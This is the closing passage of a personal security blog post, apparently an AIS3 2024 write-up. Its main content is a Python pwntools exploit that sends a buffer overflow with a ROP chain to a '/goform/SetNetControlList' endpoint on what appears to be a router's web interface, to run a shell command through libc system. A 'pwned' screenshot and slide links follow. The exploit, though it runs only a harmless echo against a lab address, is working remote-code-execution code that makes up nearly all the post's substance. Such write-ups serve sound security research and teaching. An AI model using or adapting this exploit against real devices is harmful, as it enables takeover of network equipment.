+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.247.132&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://&#123;&#125;/goform/SetNetControlList&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x3fd9c000</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">b&quot;echo pwned by NAUP&quot;</span></span><br><span class="line"></span><br><span class="line">system_libc = libc_base + <span class="number">0x5a270</span></span><br><span class="line">mov_r0_sp_blx_r3 = libc_base + <span class="number">0x40cb8</span></span><br><span class="line">pop_r3_pc = libc_base + <span class="number">0x18298</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x260</span> + p32(pop_r3_pc) + p32(system_libc) + p32(mov_r0_sp_blx_r3) + command</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=naup&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;list&quot;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, cookies=cookie, data=data)</span><br><span class="line">response = requests.post(url, cookies=cookie, data=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="pwned-1"><a href="#pwned-1" class="headerlink" title="pwned"></a>pwned</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/S15R83uFA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S15R83uFA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h1 id="簡報"><a href="#簡報" class="headerlink" title="簡報"></a>簡報</h1><p>以下是我的簡報連結</p>
+<div class="img-item" data-src="/2024/08/05/AIS3-2024/slides.png" data-sub-html=".caption"><img src="/2024/08/05/AIS3-2024/slides.png" class=""></div>
+
+<p><a target="_blank" rel="noopener" href="https://www.canva.com/design/DAGMxyN3Vps/PEbWMzWHG4STGPuQHgkKdQ/edit?utm_content=DAGMxyN3Vps&utm_campaign=designshare&utm_medium=link2&utm_source=sharebutton">https://www.canva.com/design/DAGMxyN3Vps/PEbWMzWHG4STGPuQHgkKdQ/edit?utm_content=DAGMxyN3Vps&amp;utm_campaign=designshare&amp;utm_medium=link2&amp;utm_source=sharebutton</a></p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/07/26/Pwn-File-Structure-note/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
